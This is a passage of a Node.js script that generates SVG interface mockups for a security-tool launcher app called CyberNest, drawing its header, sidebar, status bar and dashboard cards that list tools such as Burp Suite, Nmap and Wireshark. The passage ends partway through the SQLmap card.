const fs = require('fs');
const path = require('path');

const OUT_DIR = 'D:/AIAgent/CyberNest/prototypes';

// Common SVG Gradients, Filters & Styles
const SVG_DEFS = `
  <defs>
    <linearGradient id="cyanGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#0284C7"/>
      <stop offset="100%" stop-color="#0EA5E9"/>
    </linearGradient>
    <linearGradient id="emeraldGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#059669"/>
      <stop offset="100%" stop-color="#10B981"/>
    </linearGradient>
    <linearGradient id="purpleGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#7C3AED"/>
      <stop offset="100%" stop-color="#A855F7"/>
    </linearGradient>
    <linearGradient id="amberGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#D97706"/>
      <stop offset="100%" stop-color="#F59E0B"/>
    </linearGradient>
    <linearGradient id="cardBgGradient" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1E293B"/>
      <stop offset="100%" stop-color="#162032"/>
    </linearGradient>
    <linearGradient id="cardHoverGradient" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#26354D"/>
      <stop offset="100%" stop-color="#1A2538"/>
    </linearGradient>
    <filter id="cardShadow" x="-5%" y="-5%" width="110%" height="115%">
      <feDropShadow dx="0" dy="4" stdDeviation="6" flood-color="#000000" flood-opacity="0.4"/>
    </filter>
    <filter id="cyanGlow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="0" stdDeviation="4" flood-color="#0EA5E9" flood-opacity="0.6"/>
    </filter>
  </defs>
  <style>
    .font-sans { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif; }
    .font-mono { font-family: 'JetBrains Mono', 'Fira Code', Consolas, monospace; }
  </style>
`;

function renderWindowHeader() {
  return `
  <!-- Top Window Header (40px) -->
  <rect x="0" y="0" width="1280" height="40" fill="#0F172A"/>
  <line x1="0" y1="40" x2="1280" y2="40" stroke="#1E293B" stroke-width="1"/>

  <!-- Logo & App Title -->
  <g transform="translate(16, 11)">
    <path d="M9 2L2 5v6c0 5.5 3.8 10.7 7 12 3.2-1.3 7-6.5 7-12V5L9 2z" fill="#0EA5E9" fill-opacity="0.2" stroke="#0EA5E9" stroke-width="1.6"/>
    <path d="M6 10l3 3 5-5" fill="none" stroke="#38BDF8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
  </g>
  <text x="42" y="25" class="font-sans" font-size="14" font-weight="700" fill="#F8FAFC">CyberNest</text>
  <rect x="122" y="12" width="76" height="18" rx="4" fill="#1E293B"/>
  <text x="130" y="24" class="font-mono" font-size="10" fill="#64748B">v0.1.0-alpha</text>

  <!-- Center Quick Search Bar -->
  <g transform="translate(460, 6)">
    <rect x="0" y="0" width="360" height="28" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
    <!-- Search Icon -->
    <path d="M12 9A4 4 0 1 0 4 9a4 4 0 0 0 8 0zm-1 3l3.5 3.5" transform="translate(10, 5)" fill="none" stroke="#64748B" stroke-width="1.5" stroke-linecap="round"/>
    <text x="34" y="18" class="font-sans" font-size="11" fill="#64748B">快速启动工具、搜索备忘、命令...</text>
    <!-- Hotkey Pill -->
    <rect x="296" y="4" width="56" height="20" rx="4" fill="#0F172A" stroke="#475569" stroke-width="0.8"/>
    <text x="304" y="18" class="font-mono" font-size="9" fill="#94A3B8">Ctrl + K</text>
  </g>

  <!-- Right Status & Window Controls -->
  <g transform="translate(1080, 12)">
    <circle cx="10" cy="8" r="4" fill="#10B981"/>
    <circle cx="10" cy="8" r="8" fill="#10B981" fill-opacity="0.2"/>
    <text x="24" y="12" class="font-sans" font-size="11" fill="#94A3B8">SQLite: Ready</text>
  </g>
  <g transform="translate(1200, 0)">
    <!-- Minimize -->
    <rect x="0" y="0" width="26" height="40" fill="transparent"/>
    <line x1="8" y1="20" x2="18" y2="20" stroke="#94A3B8" stroke-width="1.5"/>
    <!-- Maximize -->
    <rect x="26" y="0" width="26" height="40" fill="transparent"/>
    <rect x="34" y="15" width="10" height="10" fill="none" stroke="#94A3B8" stroke-width="1.2"/>
    <!-- Close -->
    <rect x="52" y="0" width="28" height="40" fill="transparent"/>
    <line x1="60" y1="15" x2="70" y2="25" stroke="#94A3B8" stroke-width="1.5"/>
    <line x1="70" y1="15" x2="60" y2="25" stroke="#94A3B8" stroke-width="1.5"/>
  </g>
  `;
}

function renderSidebar(activeTab = 'dashboard') {
  const isDashboard = activeTab === 'dashboard';
  const isAllTools = activeTab === 'all_tools';
  const isCategories = activeTab === 'categories';
  const isAddTool = activeTab === 'add_tool';
  const isSettings = activeTab === 'settings';

  return `
  <!-- Left Sidebar (240px) -->
  <rect x="0" y="40" width="240" height="760" fill="#0F172A"/>
  <line x1="240" y1="40" x2="240" y2="800" stroke="#1E293B" stroke-width="1"/>

  <!-- Top Action: + 添加工具 Button -->
  <g transform="translate(16, 56)">
    <rect x="0" y="0" width="208" height="38" rx="6" fill="${isAddTool ? '#0284C7' : 'url(#cyanGradient)'}" filter="${isAddTool ? 'url(#cyanGlow)' : 'none'}"/>
    <path d="M12 5v14m-7-7h14" transform="translate(48, 7)" fill="none" stroke="#FFFFFF" stroke-width="2" stroke-linecap="round"/>
    <text x="84" y="24" class="font-sans" font-size="13" font-weight="600" fill="#FFFFFF">添加新工具</text>
  </g>

  <!-- Section Label: 主导航 -->
  <text x="20" y="122" class="font-sans" font-size="10" font-weight="700" fill="#64748B" letter-spacing="1">MAIN NAVIGATION</text>

  <!-- Nav Item 1: 首页 Dashboard -->
  <g transform="translate(0, 134)">
    ${isDashboard ? `
      <rect x="0" y="0" width="3" height="38" fill="#0EA5E9"/>
      <rect x="8" y="0" width="224" height="38" rx="6" fill="#1E293B"/>
    ` : `
      <rect x="8" y="0" width="224" height="38" rx="6" fill="transparent"/>
    `}
    <!-- Dashboard Icon -->
    <path d="M3 3h7v7H3zm11 0h7v7h-7zM3 14h7v7H3zm11 0h7v7h-7z" transform="translate(24, 9) scale(0.9)" fill="none" stroke="${isDashboard ? '#38BDF8' : '#94A3B8'}" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
    <text x="54" y="24" class="font-sans" font-size="13" font-weight="${isDashboard ? '600' : '500'}" fill="${isDashboard ? '#F8FAFC' : '#94A3B8'}">首页 (Dashboard)</text>
  </g>

  <!-- Nav Item 2: 全部工具 All Tools -->
  <g transform="translate(0, 178)">
    ${isAllTools ? `
      <rect x="0" y="0" width="3" height="38" fill="#0EA5E9"/>
      <rect x="8" y="0" width="224" height="38" rx="6" fill="#1E293B"/>
    ` : `
      <rect x="8" y="0" width="224" height="38" rx="6" fill="transparent"/>
    `}
    <!-- Layers Icon -->
    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" transform="translate(24, 9) scale(0.9)" fill="none" stroke="${isAllTools ? '#38BDF8' : '#94A3B8'}" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
    <text x="54" y="24" class="font-sans" font-size="13" font-weight="${isAllTools ? '600' : '500'}" fill="${isAllTools ? '#F8FAFC' : '#94A3B8'}">全部工具</text>
    <!-- Badge -->
    <rect x="188" y="10" width="32" height="18" rx="9" fill="${isAllTools ? '#0EA5E9' : '#334155'}" fill-opacity="${isAllTools ? '0.2' : '0.6'}"/>
    <text x="204" y="23" text-anchor="middle" class="font-mono" font-size="10" font-weight="600" fill="${isAllTools ? '#38BDF8' : '#94A3B8'}">48</text>
  </g>

  <!-- Nav Item 3: 分类管理 Categories -->
  <g transform="translate(0, 222)">
    ${isCategories ? `
      <rect x="0" y="0" width="3" height="38" fill="#0EA5E9"/>
      <rect x="8" y="0" width="224" height="38" rx="6" fill="#1E293B"/>
    ` : `
      <rect x="8" y="0" width="224" height="38" rx="6" fill="transparent"/>
    `}
    <!-- FolderTree Icon -->
    <path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2z" transform="translate(24, 9) scale(0.9)" fill="none" stroke="${isCategories ? '#38BDF8' : '#94A3B8'}" stroke-width="1.8"/>
    <text x="54" y="24" class="font-sans" font-size="13" font-weight="${isCategories ? '600' : '500'}" fill="${isCategories ? '#F8FAFC' : '#94A3B8'}">分类与标签管理</text>
    <rect x="194" y="10" width="26" height="18" rx="9" fill="${isCategories ? '#0EA5E9' : '#334155'}" fill-opacity="${isCategories ? '0.2' : '0.6'}"/>
    <text x="207" y="23" text-anchor="middle" class="font-mono" font-size="10" font-weight="600" fill="${isCategories ? '#38BDF8' : '#94A3B8'}">8</text>
  </g>

  <!-- Section Label: 常用安全分类 -->
  <text x="20" y="288" class="font-sans" font-size="11" font-weight="700" fill="#94A3B8" letter-spacing="1">QUICK CATEGORIES 快速分类</text>

  <!-- Quick Category Items -->
  <g transform="translate(0, 304)">
    <rect x="8" y="0" width="224" height="32" rx="4" fill="transparent"/>
    <circle cx="32" cy="16" r="4" fill="#0EA5E9"/>
    <text x="46" y="20" class="font-sans" font-size="13.5" font-weight="500" fill="#E2E8F0">Web 渗透工具</text>
    <text x="210" y="20" text-anchor="end" class="font-mono" font-size="12" fill="#64748B">16</text>
  </g>
  <g transform="translate(0, 338)">
    <rect x="8" y="0" width="224" height="32" rx="4" fill="transparent"/>
    <circle cx="32" cy="16" r="4" fill="#10B981"/>
    <text x="46" y="20" class="font-sans" font-size="13.5" font-weight="500" fill="#E2E8F0">信息收集与探测</text>
    <text x="210" y="20" text-anchor="end" class="font-mono" font-size="12" fill="#64748B">12</text>
  </g>
  <g transform="translate(0, 372)">
    <rect x="8" y="0" width="224" height="32" rx="4" fill="transparent"/>
    <circle cx="32" cy="16" r="4" fill="#F59E0B"/>
    <text x="46" y="20" class="font-sans" font-size="13.5" font-weight="500" fill="#E2E8F0">漏洞扫描与验证</text>
    <text x="210" y="20" text-anchor="end" class="font-mono" font-size="12" fill="#64748B">8</text>
  </g>
  <g transform="translate(0, 406)">
    <rect x="8" y="0" width="224" height="32" rx="4" fill="transparent"/>
    <circle cx="32" cy="16" r="4" fill="#A855F7"/>
    <text x="46" y="20" class="font-sans" font-size="13.5" font-weight="500" fill="#E2E8F0">逆向与二进制分析</text>
    <text x="210" y="20" text-anchor="end" class="font-mono" font-size="12" fill="#64748B">5</text>
  </g>
  <g transform="translate(0, 440)">
    <rect x="8" y="0" width="224" height="32" rx="4" fill="transparent"/>
    <circle cx="32" cy="16" r="4" fill="#EF4444"/>
    <text x="46" y="20" class="font-sans" font-size="13.5" font-weight="500" fill="#E2E8F0">内网渗透与提权</text>
    <text x="210" y="20" text-anchor="end" class="font-mono" font-size="12" fill="#64748B">4</text>
  </g>

    <!-- Bottom Section: Settings (Above Engine Ready) + Engine Status & Collapse -->
  <line x1="16" y1="675" x2="224" y2="675" stroke="#1E293B" stroke-width="1"/>

  <!-- Nav Item: 系统设置 (Pinned to bottom-left above engine ready) -->
  <g transform="translate(0, 685)">
    ${isSettings ? `
      <rect x="0" y="0" width="3" height="36" fill="#0EA5E9"/>
      <rect x="8" y="0" width="224" height="36" rx="6" fill="#1E293B"/>
    ` : `
      <rect x="8" y="0" width="224" height="36" rx="6" fill="transparent"/>
    `}
    <!-- Settings Gear Icon -->
    <path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6z M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" transform="translate(24, 8) scale(0.85)" fill="none" stroke="${isSettings ? '#38BDF8' : '#94A3B8'}" stroke-width="1.6"/>
    <text x="54" y="23" class="font-sans" font-size="12" font-weight="${isSettings ? '600' : '500'}" fill="${isSettings ? '#F8FAFC' : '#94A3B8'}">系统设置</text>
    <rect x="180" y="9" width="34" height="18" rx="3" fill="#162032"/>
    <text x="197" y="21" text-anchor="middle" class="font-mono" font-size="9" fill="#64748B">偏好</text>
  </g>

  <!-- Engine Ready Status & Collapse Bar (Below Settings) -->
  <line x1="16" y1="730" x2="224" y2="730" stroke="#1E293B" stroke-width="0.8"/>
  <g transform="translate(16, 738)">
    <rect x="0" y="0" width="208" height="28" rx="4" fill="#0B0F17" stroke="#1E293B" stroke-width="0.8"/>
    <circle cx="12" cy="14" r="3" fill="#10B981"/>
    <text x="22" y="18" class="font-sans" font-size="11" fill="#64748B">引擎就绪 (v1.0)</text>
    <!-- Collapse Icon -->
    <path d="M11 19l-7-7 7-7m8 14l-7-7 7-7" transform="translate(180, 5) scale(0.7)" fill="none" stroke="#64748B" stroke-width="1.8" stroke-linecap="round"/>
  </g>
  `;
}

console.log('Common components declared.');


function renderStatusBar(activeTab = 'dashboard') {
  return `
  <!-- Bottom StatusBar (28px) -->
  <rect x="0" y="772" width="1280" height="28" fill="#0D121F"/>
  <line x1="0" y1="772" x2="1280" y2="772" stroke="#1E293B" stroke-width="1"/>

  <!-- Left: Engine Status -->
  <g transform="translate(16, 780)">
    <circle cx="4" cy="6" r="3" fill="#10B981"/>
    <text x="14" y="10" class="font-mono" font-size="10" font-weight="600" fill="#10B981">SQLITE / INDEXEDDB 就绪</text>
    <line x1="165" y1="0" x2="165" y2="12" stroke="#334155" stroke-width="1"/>
    <text x="178" y="10" class="font-mono" font-size="10" fill="#94A3B8">工具资产: <tspan fill="#F8FAFC" font-weight="700">48</tspan></text>
    <text x="260" y="10" class="font-mono" font-size="10" fill="#94A3B8">常驻收藏: <tspan fill="#F59E0B" font-weight="700">6</tspan></text>
  </g>

  <!-- Center: Protection Notice -->
  <g transform="translate(540, 780)">
    <text x="0" y="10" class="font-sans" font-size="10" fill="#64748B">🛡 100% 离线零遥测保护已启用</text>
  </g>

  <!-- Right: Shortcut reminders -->
  <g transform="translate(1120, 775)">
    <rect x="0" y="2" width="68" height="18" rx="3" fill="#1E293B"/>
    <text x="34" y="14" text-anchor="middle" class="font-mono" font-size="9" fill="#94A3B8">Alt+Space</text>
    <rect x="74" y="2" width="58" height="18" rx="3" fill="#1E293B"/>
    <text x="103" y="14" text-anchor="middle" class="font-mono" font-size="9" fill="#94A3B8">Tauri 2.0</text>
  </g>
  `;
}

function generateDashboardSvg() {
  return `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 800" width="1280" height="800">
  ${SVG_DEFS}
  <!-- Window Base Canvas -->
  <rect width="1280" height="800" rx="10" fill="#0B0F17" stroke="#1E293B" stroke-width="1.5"/>

  ${renderWindowHeader()}
  ${renderSidebar('dashboard')}

  <!-- Main Content Area: Dashboard (1040 x 760) -->
  <!-- Top Greeting & Stats Banner -->
  <g transform="translate(264, 54)">
    <rect x="0" y="0" width="992" height="60" rx="8" fill="#131B2B" stroke="#1E293B" stroke-width="1"/>
    <!-- Left Text -->
    <text x="20" y="27" class="font-sans" font-size="16" font-weight="700" fill="#F8FAFC">安全工具中枢控制台 (Cyber Command Cockpit)</text>
    <text x="20" y="47" class="font-sans" font-size="11" fill="#94A3B8">终端环境正常 · 本地 SQLite 离线军火库已就绪 · 共收录 48 款安全资产</text>
    <!-- Right Stats Pills -->
    <g transform="translate(620, 16)">
      <rect x="0" y="0" width="105" height="28" rx="6" fill="#1E293B" stroke="#334155" stroke-width="1"/>
      <circle cx="14" cy="14" r="4" fill="#38BDF8"/>
      <text x="26" y="18" class="font-sans" font-size="11" fill="#CBD5E1">全部收录 <tspan class="font-mono" font-weight="700" fill="#F8FAFC">48</tspan></text>

      <rect x="115" y="0" width="115" height="28" rx="6" fill="#1E293B" stroke="#D97706" stroke-width="0.8"/>
      <text x="127" y="18" class="font-sans" font-size="11" fill="#F59E0B">★ 常用收藏 <tspan class="font-mono" font-weight="700">12</tspan></text>

      <rect x="240" y="0" width="120" height="28" rx="6" fill="#1E293B" stroke="#059669" stroke-width="0.8"/>
      <text x="252" y="18" class="font-sans" font-size="11" fill="#10B981">● 本地可执行 <tspan class="font-mono" font-weight="700">22</tspan></text>
    </g>
  </g>

  <!-- Section 1: Quick Categories Row -->
  <g transform="translate(264, 126)">
    <!-- Category 1: Web Pentest -->
    <g transform="translate(0, 0)">
      <rect x="0" y="0" width="236" height="70" rx="8" fill="url(#cardBgGradient)" stroke="#0EA5E9" stroke-opacity="0.4" stroke-width="1"/>
      <rect x="14" y="14" width="42" height="42" rx="8" fill="#0EA5E9" fill-opacity="0.15"/>
      <!-- Globe Icon -->
      <circle cx="35" cy="35" r="11" fill="none" stroke="#38BDF8" stroke-width="1.8"/>
      <ellipse cx="35" cy="35" rx="5" ry="11" fill="none" stroke="#38BDF8" stroke-width="1.2"/>
      <line x1="24" y1="35" x2="46" y2="35" stroke="#38BDF8" stroke-width="1.2"/>
      <text x="66" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Web 渗透测试</text>
      <text x="66" y="48" class="font-sans" font-size="11" fill="#64748B">Burp, SQLmap, Dirsearch...</text>
      <rect x="194" y="14" width="28" height="18" rx="9" fill="#0EA5E9" fill-opacity="0.2"/>
      <text x="208" y="27" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#38BDF8">16</text>
    </g>

    <!-- Category 2: Recon -->
    <g transform="translate(252, 0)">
      <rect x="0" y="0" width="236" height="70" rx="8" fill="url(#cardBgGradient)" stroke="#10B981" stroke-opacity="0.4" stroke-width="1"/>
      <rect x="14" y="14" width="42" height="42" rx="8" fill="#10B981" fill-opacity="0.15"/>
      <!-- Radar Icon -->
      <circle cx="35" cy="35" r="11" fill="none" stroke="#34D399" stroke-width="1.8"/>
      <circle cx="35" cy="35" r="5" fill="none" stroke="#34D399" stroke-width="1.2"/>
      <line x1="35" y1="35" x2="43" y2="27" stroke="#34D399" stroke-width="1.8" stroke-linecap="round"/>
      <text x="66" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">信息收集与探测</text>
      <text x="66" y="48" class="font-sans" font-size="11" fill="#64748B">Nmap, FOFA, Sublist3r...</text>
      <rect x="194" y="14" width="28" height="18" rx="9" fill="#10B981" fill-opacity="0.2"/>
      <text x="208" y="27" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#34D399">12</text>
    </g>

    <!-- Category 3: Vuln Scanning -->
    <g transform="translate(504, 0)">
      <rect x="0" y="0" width="236" height="70" rx="8" fill="url(#cardBgGradient)" stroke="#F59E0B" stroke-opacity="0.4" stroke-width="1"/>
      <rect x="14" y="14" width="42" height="42" rx="8" fill="#F59E0B" fill-opacity="0.15"/>
      <!-- Alert Icon -->
      <path d="M12 2L2 22h20L12 2z M12 9v5 M12 18h.01" transform="translate(23, 23) scale(0.9)" fill="none" stroke="#FBBF24" stroke-width="1.8" stroke-linecap="round"/>
      <text x="66" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">漏洞扫描与评估</text>
      <text x="66" y="48" class="font-sans" font-size="11" fill="#64748B">Nuclei, Xray, Nessus...</text>
      <rect x="200" y="14" width="22" height="18" rx="9" fill="#F59E0B" fill-opacity="0.2"/>
      <text x="211" y="27" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#FBBF24">8</text>
    </g>

    <!-- Category 4: Reverse Eng -->
    <g transform="translate(756, 0)">
      <rect x="0" y="0" width="236" height="70" rx="8" fill="url(#cardBgGradient)" stroke="#A855F7" stroke-opacity="0.4" stroke-width="1"/>
      <rect x="14" y="14" width="42" height="42" rx="8" fill="#A855F7" fill-opacity="0.15"/>
      <!-- Binary/Cpu Icon -->
      <rect x="27" y="27" width="16" height="16" rx="3" fill="none" stroke="#C084FC" stroke-width="1.8"/>
      <line x1="27" y1="31" x2="23" y2="31" stroke="#C084FC" stroke-width="1.5"/>
      <line x1="27" y1="39" x2="23" y2="39" stroke="#C084FC" stroke-width="1.5"/>
      <line x1="43" y1="31" x2="47" y2="31" stroke="#C084FC" stroke-width="1.5"/>
      <line x1="43" y1="39" x2="47" y2="39" stroke="#C084FC" stroke-width="1.5"/>
      <text x="66" y="32" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">逆向与二进制</text>
      <text x="66" y="48" class="font-sans" font-size="11" fill="#64748B">Ghidra, IDA Pro, x64dbg...</text>
      <rect x="200" y="14" width="22" height="18" rx="9" fill="#A855F7" fill-opacity="0.2"/>
      <text x="211" y="27" text-anchor="middle" class="font-mono" font-size="10" font-weight="700" fill="#C084FC">5</text>
    </g>
  </g>

  <!-- Section 2: Starred / Favorite Tools (Grid of 6 Cards) -->
  <g transform="translate(264, 214)">
    <text x="0" y="0" class="font-sans" font-size="14" font-weight="700" fill="#F8FAFC">★ 核心常驻与收藏工具 (FAVORITE TOOLS)</text>
    <text x="992" y="0" text-anchor="end" class="font-sans" font-size="11" fill="#38BDF8">查看全部 12 款收藏 →</text>

    <!-- Row 1 of Favorite Cards -->
    <!-- Card 1: Burp Suite Pro -->
    <g transform="translate(0, 14)">
      <rect x="0" y="0" width="318" height="132" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <!-- Top Row: Icon + Name + Star -->
      <rect x="14" y="14" width="32" height="32" rx="6" fill="#F97316" fill-opacity="0.2"/>
      <text x="30" y="35" text-anchor="middle" class="font-sans" font-size="16" font-weight="800" fill="#FB923C">B</text>
      <text x="56" y="27" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Burp Suite Pro</text>
      <rect x="56" y="32" width="70" height="16" rx="4" fill="#10B981" fill-opacity="0.15"/>
      <text x="91" y="44" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#34D399">LOCAL GUI</text>
      <!-- Star Button -->
      <text x="296" y="28" font-size="14" fill="#F59E0B">★</text>
      <!-- Description -->
      <text x="14" y="66" class="font-sans" font-size="11" fill="#94A3B8">Web 安全测试、中间人代理与自动化扫描套件</text>
      <!-- Tags -->
      <g transform="translate(14, 76)">
        <rect x="0" y="0" width="46" height="18" rx="4" fill="#1E293B"/>
        <text x="23" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Web</text>
        <rect x="52" y="0" width="54" height="18" rx="4" fill="#1E293B"/>
        <text x="79" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Proxy</text>
      </g>
      <!-- Bottom Launch Button & Path -->
      <line x1="0" y1="100" x2="318" y2="100" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="119" class="font-mono" font-size="10" fill="#64748B">.../BurpSuitePro.exe</text>
      <rect x="236" y="105" width="70" height="22" rx="4" fill="url(#emeraldGradient)"/>
      <text x="271" y="120" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">▶ 启动</text>
    </g>

    <!-- Card 2: Nmap Scanner -->
    <g transform="translate(337, 14)">
      <rect x="0" y="0" width="318" height="132" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <rect x="14" y="14" width="32" height="32" rx="6" fill="#10B981" fill-opacity="0.2"/>
      <text x="30" y="35" text-anchor="middle" class="font-sans" font-size="14" font-weight="800" fill="#34D399">N</text>
      <text x="56" y="27" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Nmap Scanner</text>
      <rect x="56" y="32" width="68" height="16" rx="4" fill="#10B981" fill-opacity="0.15"/>
      <text x="90" y="44" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#34D399">LOCAL CLI</text>
      <text x="296" y="28" font-size="14" fill="#F59E0B">★</text>
      <text x="14" y="66" class="font-sans" font-size="11" fill="#94A3B8">网络资产发现、端口指纹扫描与脆弱性探测</text>
      <g transform="translate(14, 76)">
        <rect x="0" y="0" width="52" height="18" rx="4" fill="#1E293B"/>
        <text x="26" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#34D399">#Recon</text>
        <rect x="58" y="0" width="66" height="18" rx="4" fill="#1E293B"/>
        <text x="91" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#34D399">#PortScan</text>
      </g>
      <line x1="0" y1="100" x2="318" y2="100" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="119" class="font-mono" font-size="10" fill="#64748B">.../nmap.exe</text>
      <rect x="226" y="105" width="80" height="22" rx="4" fill="url(#emeraldGradient)"/>
      <text x="266" y="120" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">&gt;_ 终端运行</text>
    </g>

    <!-- Card 3: CyberChef -->
    <g transform="translate(674, 14)">
      <rect x="0" y="0" width="318" height="132" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <rect x="14" y="14" width="32" height="32" rx="6" fill="#0EA5E9" fill-opacity="0.2"/>
      <text x="30" y="35" text-anchor="middle" class="font-sans" font-size="14" font-weight="800" fill="#38BDF8">C</text>
      <text x="56" y="27" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">CyberChef Online</text>
      <rect x="56" y="32" width="76" height="16" rx="4" fill="#0EA5E9" fill-opacity="0.15"/>
      <text x="94" y="44" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#38BDF8">WEB ONLINE</text>
      <text x="296" y="28" font-size="14" fill="#F59E0B">★</text>
      <text x="14" y="66" class="font-sans" font-size="11" fill="#94A3B8">网络从业者万能编码解码、格式转换瑞士军刀</text>
      <g transform="translate(14, 76)">
        <rect x="0" y="0" width="58" height="18" rx="4" fill="#1E293B"/>
        <text x="29" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Crypto</text>
        <rect x="64" y="0" width="58" height="18" rx="4" fill="#1E293B"/>
        <text x="93" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#38BDF8">#Decode</text>
      </g>
      <line x1="0" y1="100" x2="318" y2="100" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="119" class="font-mono" font-size="10" fill="#64748B">gchq.github.io/CyberChef</text>
      <rect x="226" y="105" width="80" height="22" rx="4" fill="url(#cyanGradient)"/>
      <text x="266" y="120" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">↗ 打开网页</text>
    </g>

    <!-- Row 2 of Favorite Cards -->
    <!-- Card 4: Wireshark -->
    <g transform="translate(0, 158)">
      <rect x="0" y="0" width="318" height="132" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <rect x="14" y="14" width="32" height="32" rx="6" fill="#3B82F6" fill-opacity="0.2"/>
      <text x="30" y="35" text-anchor="middle" class="font-sans" font-size="14" font-weight="800" fill="#60A5FA">W</text>
      <text x="56" y="27" class="font-sans" font-size="13" font-weight="700" fill="#F8FAFC">Wireshark</text>
      <rect x="56" y="32" width="70" height="16" rx="4" fill="#10B981" fill-opacity="0.15"/>
      <text x="91" y="44" text-anchor="middle" class="font-mono" font-size="9" font-weight="700" fill="#34D399">LOCAL GUI</text>
      <text x="296" y="28" font-size="14" fill="#F59E0B">★</text>
      <text x="14" y="66" class="font-sans" font-size="11" fill="#94A3B8">底层网络抓包、协议逆向解析与通信深度分析</text>
      <g transform="translate(14, 76)">
        <rect x="0" y="0" width="56" height="18" rx="4" fill="#1E293B"/>
        <text x="28" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#60A5FA">#Traffic</text>
        <rect x="62" y="0" width="56" height="18" rx="4" fill="#1E293B"/>
        <text x="90" y="13" text-anchor="middle" class="font-mono" font-size="10" fill="#60A5FA">#Packet</text>
      </g>
      <line x1="0" y1="100" x2="318" y2="100" stroke="#1E293B" stroke-width="1"/>
      <text x="14" y="119" class="font-mono" font-size="10" fill="#64748B">.../Wireshark.exe</text>
      <rect x="236" y="105" width="70" height="22" rx="4" fill="url(#emeraldGradient)"/>
      <text x="271" y="120" text-anchor="middle" class="font-sans" font-size="11" font-weight="600" fill="#FFFFFF">▶ 启动</text>
    </g>

    <!-- Card 5: SQLmap -->
    <g transform="translate(337, 158)">
      <rect x="0" y="0" width="318" height="132" rx="8" fill="url(#cardBgGradient)" stroke="#334155" stroke-width="1" filter="url(#cardShadow)"/>
      <rect x="14" y="14" width="32" height="32" rx="6" fill="#A855F7" fill-opacity="0.2"/>
      <text x="30" y="35" text-anchor="middle" class="font-sans" font-size="14" font-weight="800" fill="#C084FC">S</text>
